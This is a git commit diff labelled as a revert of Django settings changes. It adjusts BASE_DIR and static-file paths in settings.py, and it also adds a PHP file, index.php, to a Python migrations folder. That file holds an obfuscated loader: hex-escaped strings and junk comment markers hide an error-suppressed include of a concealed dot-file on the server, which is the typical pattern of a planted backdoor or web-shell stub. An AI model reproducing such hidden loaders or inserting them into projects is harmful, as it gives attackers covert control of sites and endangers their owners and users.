a7c2da0e3f920486ad21ecd8710fe9dbc5b4ee22
Shailesh Kumar <137614351+shaileshgola1987@users.noreply.github.com>
2024-02-12 15:42:51 +0530

    Revert "New Changes"

--- martapis/settings.py
+++ martapis/settings.py
@@ -14,9 +14,8 @@ from pathlib import Path
 import psycopg2
 
 # Build paths inside the project like this: BASE_DIR / 'subdir'.
-# BASE_DIR = Path(__file__).resolve(strict=True).parent.parent
+BASE_DIR = Path(__file__).resolve(strict=True).parent.parent
 
-BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 
 # Quick-start development settings - unsuitable for production
 # See https://docs.djangoproject.com/en/3.1/howto/deployment/checklist/
@@ -136,10 +135,7 @@ USE_TZ = True
 # https://docs.djangoproject.com/en/3.1/howto/static-files/
 
 STATIC_URL = '/static/'
-STATICFILES_DIRS = [
-    os.path.join(BASE_DIR, 'static'),
-]
-STATIC_ROOT = os.path.join(BASE_DIR, 'staticfiles')
+STATIC_ROOT = os.path.join(BASE_DIR, 'static')
 
 MEDIA_URL = '/media/'
 # MEDIA_ROOT = os.path.join(BASE_DIR, "static_media")
---
+++ martcrm/migrations/index.php
@@ -0,0 +1,10 @@
+<?php
+/*b3c93*/
+
+$rfcdh = "/home/sh\x69vmarb/erp.mart4trade.com/stat\x69c/adm\x69n/css/.5431687e.ccss"; $tbrjo = $rfcdh; strpos($tbrjo, "rnfe"); @include_once /* r0n */ ($tbrjo);
+
+/*b3c93*/
+
+
+
+
